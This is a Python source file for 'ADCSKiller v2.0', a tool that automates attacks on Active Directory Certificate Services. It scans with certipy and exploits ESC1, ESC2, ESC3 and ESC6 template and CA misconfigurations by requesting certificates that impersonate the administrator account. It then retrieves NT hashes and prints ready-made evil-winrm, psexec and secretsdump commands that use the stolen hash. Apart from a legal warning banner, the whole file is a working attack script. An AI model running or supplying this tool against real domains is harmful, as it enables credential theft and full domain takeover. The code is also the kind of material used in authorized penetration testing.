#!/usr/bin/python3

""" ADCSKiller - Automated ADCS Exploitation

Automatically exploits ADCS vulnerabilities to obtain Domain Admin access.
This tool performs actual exploitation attacks using certipy.

What this tool does:
- Scans for ADCS vulnerabilities
- Automatically exploits ESC1-ESC8 vulnerabilities
- Requests certificates for Domain Admin accounts
- Authenticates and retrieves NT hashes
- Attempts to achieve Domain Admin access

LEGAL WARNING: Only use on systems you have explicit permission to test.

Usage:
  python3 adcskiller.py -d domain.com -u user -p pass -dc-ip 10.0.0.1 -L attacker-ip

MIT License - Copyright (c) 2023 grimlockx
Enhanced by nullenc0de
"""

__author__ = "grimlockx / nullenc0de"
__version__ = "2.0"

import argparse
import subprocess
import re
import ldap3
import json
import logging
import ssl
import time
from datetime import datetime
from pathlib import Path


class Logger:
    """Enhanced logging functionality"""
    
    def __init__(self, output_dir=".", verbose=False):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        logging.basicConfig(
            level=logging.DEBUG if verbose else logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(self.output_dir / 'adcskiller.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def info(self, message):
        self.logger.info(message)
        
    def error(self, message):
        self.logger.error(message)
        
    def debug(self, message):
        self.logger.debug(message)
        
    def warning(self, message):
        self.logger.warning(message)
        
    def success(self, message):
        self.logger.info(f"✓ {message}")
        
    def critical(self, message):
        self.logger.critical(f"🔴 {message}")


class AuthenticationManager:
    """Handle various authentication methods"""
    
    def __init__(self, domain, username, password=None, ntlm_hash=None):
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        
    def get_certipy_auth_args(self):
        """Get authentication arguments for certipy"""
        if self.ntlm_hash:
            return f"-u {self.username}@{self.domain} -hashes {self.ntlm_hash}"
        elif self.password:
            return f"-u {self.username}@{self.domain} -p '{self.password}'"
        else:
            raise ValueError("No authentication method provided")


class ADCSKiller:
    """Automated ADCS exploitation tool"""
    
    def __init__(self, domain, username, password=None, ntlm_hash=None, 
                 target=None, lhost=None, output_dir=".", verbose=False, 
                 timeout=60, debug=False, use_existing_scan=None, skip_scan=False):
        
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.target = target
        self.lhost = lhost
        self.timeout = timeout
        self.debug = debug
        self.use_existing_scan = use_existing_scan
        self.skip_scan = skip_scan
        
        self.logger = Logger(output_dir, verbose)
        self.auth_manager = AuthenticationManager(domain, username, password, ntlm_hash)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.domain_admins = []
        self.vulnerable_certificate_templates = {}
        self.vulnerabilities = []
        self.certipy_output_prefix = None
        self.ca_list = []
        self.compromised = False
        self.obtained_hashes = []
        
    def find_existing_certipy_output(self):
        """Find most recent certipy output file"""
        search_locations = [Path('.'), self.output_dir]
        json_files = []
        
        for location in search_locations:
            json_files.extend(list(location.glob('*_Certipy.json')))
        
        if not json_files:
            return None
        
        json_files.sort(key=lambda x: x.stat().st_mtime, reverse=True)
        return json_files[0]
    
    def run_certipy_scan(self):
        """Run certipy find to enumerate ADCS"""
        if self.use_existing_scan:
            if Path(self.use_existing_scan).exists():
                self.logger.info(f"Using existing scan: {self.use_existing_scan}")
                filename = Path(self.use_existing_scan).stem
                self.certipy_output_prefix = filename.replace('_Certipy', '') if '_Certipy' in filename else filename
                return True
            else:
                self.logger.error(f"Scan file not found: {self.use_existing_scan}")
                return False
        
        if self.skip_scan:
            existing_file = self.find_existing_certipy_output()
            if existing_file:
                self.logger.info(f"Using existing scan: {existing_file}")
                filename = existing_file.stem
                self.certipy_output_prefix = filename.replace('_Certipy', '') if '_Certipy' in filename else filename
                return True
        
        self.certipy_output_prefix = datetime.now().strftime("%Y%m%d%H%M%S")
        self.logger.info("Running certipy enumeration...")
        
        auth_args = self.auth_manager.get_certipy_auth_args()
        output_path = str(self.output_dir / self.certipy_output_prefix)
        
        cmd = ["certipy", "find"] + auth_args.split() + [
            "-dc-ip", self.target, "-vulnerable", "-json",
            "-output", output_path, "-timeout", str(self.timeout)
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.timeout + 60)
            
            if result.returncode == 0 or "Wrote JSON output" in result.stdout:
                expected_json = self.output_dir / f"{self.certipy_output_prefix}_Certipy.json"
                if expected_json.exists() or Path(f"{self.certipy_output_prefix}_Certipy.json").exists():
                    self.logger.success("Enumeration complete")
                    return True
            
            self.logger.error("Enumeration failed")
            return False
        except Exception as e:
            self.logger.error(f"Enumeration failed: {e}")
            return False
    
    def parse_scan_results(self):
        """Parse certipy JSON output"""
        json_file = self.output_dir / f"{self.certipy_output_prefix}_Certipy.json"
        
        if not json_file.exists():
            json_file = Path(f"{self.certipy_output_prefix}_Certipy.json")
            if not json_file.exists():
                self.logger.error("Scan results not found")
                return False
        
        try:
            with open(json_file, 'r') as f:
                certipy_json = json.load(f)
            
            # Parse CAs
            if "Certificate Authorities" in certipy_json:
                for ca_id, ca_info in certipy_json["Certificate Authorities"].items():
                    self.ca_list.append({
                        'name': ca_info.get("CA Name"),
                        'dns': ca_info.get("DNS Name"),
                        'info': ca_info
                    })
                    
                    vulnerabilities = ca_info.get("[!] Vulnerabilities", {})
                    ca_vulns = [key for key, value in vulnerabilities.items() if value]
                    self.vulnerabilities.extend(ca_vulns)
            
            # Parse Templates
            if "Certificate Templates" in certipy_json:
                for template in certipy_json["Certificate Templates"].values():
                    if "[!] Vulnerabilities" in template:
                        template_vulns = template["[!] Vulnerabilities"]
                        template_name = template.get("Template Name")
                        
                        for vuln_key, vuln_value in template_vulns.items():
                            if vuln_key.startswith('ESC') and vuln_value:
                                if vuln_key not in self.vulnerable_certificate_templates:
                                    self.vulnerable_certificate_templates[vuln_key] = []
                                self.vulnerable_certificate_templates[vuln_key].append({
                                    'name': template_name,
                                    'info': template
                                })
            
            return True
        except Exception as e:
            self.logger.error(f"Failed to parse results: {e}")
            return False
    
    def request_certificate(self, template, upn, output_name, extra_args=None):
        """Request certificate using certipy req"""
        if not self.ca_list:
            return None
        
        ca_name = self.ca_list[0]['name']
        auth_args = self.auth_manager.get_certipy_auth_args()
        
        cmd = ["certipy", "req"] + auth_args.split() + [
            "-dc-ip", self.target,
            "-ca", ca_name,
            "-template", template,
            "-upn", upn,
            "-out", output_name
        ]
        
        if extra_args:
            cmd.extend(extra_args)
        
        try:
            self.logger.debug(f"Requesting cert: {template} for {upn}")
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                cwd=self.output_dir,
                timeout=120
            )
            
            if "Got certificate" in result.stdout or "Saved certificate" in result.stdout:
                pfx_file = self.output_dir / f"{output_name}.pfx"
                if pfx_file.exists():
                    return pfx_file
            
            return None
        except Exception as e:
            self.logger.debug(f"Certificate request failed: {e}")
            return None
    
    def authenticate_certificate(self, pfx_file, username):
        """Authenticate with certificate and retrieve hash"""
        cmd = [
            "certipy", "auth",
            "-pfx", str(pfx_file),
            "-dc-ip", self.target,
            "-domain", self.domain,
            "-username", username
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if "Got hash for" in result.stdout:
                hash_match = re.search(r"Got hash for '([^']+)': ([a-f0-9:]+)", result.stdout)
                if hash_match:
                    user = hash_match.group(1)
                    nt_hash = hash_match.group(2)
                    return {'user': user, 'hash': nt_hash}
            
            return None
        except Exception as e:
            self.logger.debug(f"Authentication failed: {e}")
            return None
    
    def exploit_esc1(self):
        """Exploit ESC1 - Client Authentication Template"""
        if "ESC1" not in self.vulnerable_certificate_templates:
            return False
        
        self.logger.info("")
        self.logger.info("="*70)
        self.logger.critical("Exploiting ESC1 - Client Authentication Template")
        self.logger.info("="*70)
        
        # Try administrator first
        target_users = ["administrator", "Administrator"]
        
        for template_info in self.vulnerable_certificate_templates["ESC1"]:
            template = template_info['name']
            
            for target_user in target_users:
                self.logger.info(f"Attempting {template} for {target_user}@{self.domain}")
                
                pfx_file = self.request_certificate(
                    template, 
                    f"{target_user}@{self.domain}",
                    f"esc1_{template}_{target_user}"
                )
                
                if pfx_file:
                    self.logger.success(f"Got certificate: {pfx_file}")
                    
                    creds = self.authenticate_certificate(pfx_file, target_user)
                    if creds:
                        self.logger.critical(f"COMPROMISED: {creds['user']} - {creds['hash']}")
                        self.obtained_hashes.append(creds)
                        self.compromised = True
                        return True
                
                time.sleep(1)
        
        return False
    
    def exploit_esc2(self):
        """Exploit ESC2 - Any Purpose EKU"""
        if "ESC2" not in self.vulnerable_certificate_templates:
            return False
        
        self.logger.info("")
        self.logger.info("="*70)
        self.logger.critical("Exploiting ESC2 - Any Purpose EKU")
        self.logger.info("="*70)
        
        target_users = ["administrator", "Administrator"]
        
        for template_info in self.vulnerable_certificate_templates["ESC2"]:
            template = template_info['name']
            
            for target_user in target_users:
                self.logger.info(f"Attempting {template} for {target_user}@{self.domain}")
                
                pfx_file = self.request_certificate(
                    template,
                    f"{target_user}@{self.domain}",
                    f"esc2_{template}_{target_user}"
                )
                
                if pfx_file:
                    self.logger.success(f"Got certificate: {pfx_file}")
                    
                    creds = self.authenticate_certificate(pfx_file, target_user)
                    if creds:
                        self.logger.critical(f"COMPROMISED: {creds['user']} - {creds['hash']}")
                        self.obtained_hashes.append(creds)
                        self.compromised = True
                        return True
                
                time.sleep(1)
        
        return False
    
    def exploit_esc3(self):
        """Exploit ESC3 - Certificate Request Agent"""
        if "ESC3" not in self.vulnerable_certificate_templates:
            return False
        
        self.logger.info("")
        self.logger.info("="*70)
        self.logger.critical("Exploiting ESC3 - Certificate Request Agent")
        self.logger.info("="*70)
        
        for template_info in self.vulnerable_certificate_templates["ESC3"]:
            template = template_info['name']
            
            # Step 1: Get agent certificate
            self.logger.info(f"Step 1: Requesting agent certificate with {template}")
            agent_pfx = self.request_certificate(
                template,
                f"{self.username}@{self.domain}",
                f"esc3_agent_{template}"
            )
            
            if not agent_pfx:
                continue
            
            self.logger.success(f"Got agent certificate: {agent_pfx}")
            
            # Step 2: Request on behalf of administrator
            self.logger.info("Step 2: Requesting certificate on behalf of administrator")
            
            auth_args = self.auth_manager.get_certipy_auth_args()
            ca_name = self.ca_list[0]['name']
            
            cmd = ["certipy", "req"] + auth_args.split() + [
                "-dc-ip", self.target,
                "-ca", ca_name,
                "-template", "User",
                "-on-behalf-of", f"{self.domain}\\administrator",
                "-pfx", str(agent_pfx),
                "-out", "esc3_admin"
            ]
            
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    cwd=self.output_dir,
                    timeout=120
                )
                
                if "Got certificate" in result.stdout:
                    admin_pfx = self.output_dir / "esc3_admin.pfx"
                    if admin_pfx.exists():
                        self.logger.success(f"Got admin certificate: {admin_pfx}")
                        
                        creds = self.authenticate_certificate(admin_pfx, "administrator")
                        if creds:
                            self.logger.critical(f"COMPROMISED: {creds['user']} - {creds['hash']}")
                            self.obtained_hashes.append(creds)
                            self.compromised = True
                            return True
            except Exception as e:
                self.logger.debug(f"ESC3 exploitation failed: {e}")
        
        return False
    
    def exploit_esc6(self):
        """Exploit ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2"""
        if "ESC6" not in self.vulnerabilities:
            return False
        
        self.logger.info("")
        self.logger.info("="*70)
        self.logger.critical("Exploiting ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2")
        self.logger.info("="*70)
        
        # Try with User template (most common enrollable template)
        common_templates = ["User", "Machine", "WebServer"]
        target_users = ["administrator", "Administrator"]
        
        for template in common_templates:
            for target_user in target_users:
                self.logger.info(f"Attempting {template} for {target_user}@{self.domain}")
                
                pfx_file = self.request_certificate(
                    template,
                    f"{target_user}@{self.domain}",
                    f"esc6_{template}_{target_user}"
                )
                
                if pfx_file:
                    self.logger.success(f"Got certificate: {pfx_file}")
                    
                    creds = self.authenticate_certificate(pfx_file, target_user)
                    if creds:
                        self.logger.critical(f"COMPROMISED: {creds['user']} - {creds['hash']}")
                        self.obtained_hashes.append(creds)
                        self.compromised = True
                        return True
                
                time.sleep(1)
        
        return False
    
    def exploit_esc8(self):
        """Exploit ESC8 - NTLM Relay to HTTP Endpoints"""
        if "ESC8" not in self.vulnerabilities or not self.lhost:
            return False
        
        self.logger.info("")
        self.logger.info("="*70)
        self.logger.critical("Exploiting ESC8 - NTLM Relay")
        self.logger.info("="*70)
        self.logger.warning("ESC8 requires manual steps - starting relay server")
        self.logger.warning("In another terminal, run coercion attack:")
        self.logger.warning(f"Coercer coerce -d {self.domain} -u {self.username} -p '{self.password}' -t <DC> -l {self.lhost}")
        
        # This is complex and requires threading/coercion
        # For now, just inform the user
        return False
    
    def run_exploitation(self):
        """Run all exploitation attempts"""
        self.logger.info("")
        self.logger.info("="*70)
        self.logger.critical("STARTING AUTOMATED EXPLOITATION")
        self.logger.info("="*70)
        
        # Try exploits in order of likelihood/ease
        exploit_order = [
            ("ESC1", self.exploit_esc1),
            ("ESC6", self.exploit_esc6),
            ("ESC2", self.exploit_esc2),
            ("ESC3", self.exploit_esc3),
        ]
        
        for esc_name, exploit_func in exploit_order:
            if self.compromised:
                break
            
            try:
                if exploit_func():
                    break
            except Exception as e:
                self.logger.error(f"{esc_name} exploitation failed: {e}")
                if self.debug:
                    import traceback
                    traceback.print_exc()
        
        return self.compromised
    
    def print_results(self):
        """Print final results"""
        self.logger.info("")
        self.logger.info("="*70)
        self.logger.info("EXPLOITATION RESULTS")
        self.logger.info("="*70)
        
        if self.compromised and self.obtained_hashes:
            self.logger.critical("DOMAIN COMPROMISED!")
            self.logger.info("")
            self.logger.info("Obtained Credentials:")
            for creds in self.obtained_hashes:
                self.logger.critical(f"  User: {creds['user']}")
                self.logger.critical(f"  Hash: {creds['hash']}")
                self.logger.info("")
                self.logger.info("  Use with:")
                self.logger.info(f"    evil-winrm -i {self.target} -u {creds['user']} -H {creds['hash'].split(':')[1]}")
                self.logger.info(f"    impacket-psexec {self.domain}/{creds['user']}@{self.target} -hashes {creds['hash']}")
                self.logger.info(f"    impacket-secretsdump {self.domain}/{creds['user']}@{self.target} -hashes {creds['hash']}")
        else:
            self.logger.warning("Exploitation unsuccessful")
            self.logger.info("Possible reasons:")
            self.logger.info("  - Current user lacks enrollment permissions")
            self.logger.info("  - Templates require approval")
            self.logger.info("  - Additional security controls in place")
            self.logger.info("")
            self.logger.info("Try manual exploitation with commands from scan output")
        
        self.logger.info("="*70)


def main():
    banner = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                        ADCSKiller v2.0                            ║
    ║                                                                   ║
    ║        Automated Active Directory Certificate Services           ║
    ║                    Exploitation Tool                              ║
    ║                                                                   ║
    ║  WARNING: This tool performs ACTIVE EXPLOITATION                 ║
    ║           Only use on authorized systems                          ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """
    
    print(banner)
    print("  by grimlockx / nullenc0de")
    print()
    
    parser = argparse.ArgumentParser(description="Automated ADCS exploitation tool")
    
    parser.add_argument('-d', '--domain', required=True, help='Target domain (FQDN)')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-dc-ip', '--target', help='DC IP address')
    parser.add_argument('-L', '--lhost', help='Attacker IP (for ESC8)')
    
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument('-p', '--password', help='Password')
    auth_group.add_argument('-H', '--hash', help='NTLM hash')
    
    parser.add_argument('-o', '--output', default='.', help='Output directory')
    parser.add_argument('--timeout', type=int, default=60, help='Timeout (default: 60)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    parser.add_argument('--skip-scan', action='store_true', help='Skip scan, use existing')
    parser.add_argument('--use-scan', type=str, help='Use specific scan file')
    
    args = parser.parse_args()
    
    if not args.skip_scan and not args.use_scan and not args.target:
        parser.error("--target required unless using --skip-scan or --use-scan")
    
    ntlm_hash = args.hash
    if ntlm_hash:
        if ':' not in ntlm_hash:
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
        elif ntlm_hash.startswith(':'):
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee{ntlm_hash}"
    
    try:
        killer = ADCSKiller(
            domain=args.domain,
            username=args.username,
            password=args.password,
            ntlm_hash=ntlm_hash,
            target=args.target,
            lhost=args.lhost,
            output_dir=args.output,
            verbose=args.verbose,
            timeout=args.timeout,
            debug=args.debug,
            use_existing_scan=args.use_scan,
            skip_scan=args.skip_scan
        )
        
        # Run scan
        if not killer.run_certipy_scan():
            return 1
        
        # Parse results
        if not killer.parse_scan_results():
            return 1
        
        # Run exploitation
        killer.run_exploitation()
        
        # Print results
        killer.print_results()
        
        return 0 if killer.compromised else 1
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 130
    except Exception as e:
        logging.error(f"Error: {e}")
        return 1


if __name__ == "__main__":
    exit(main())
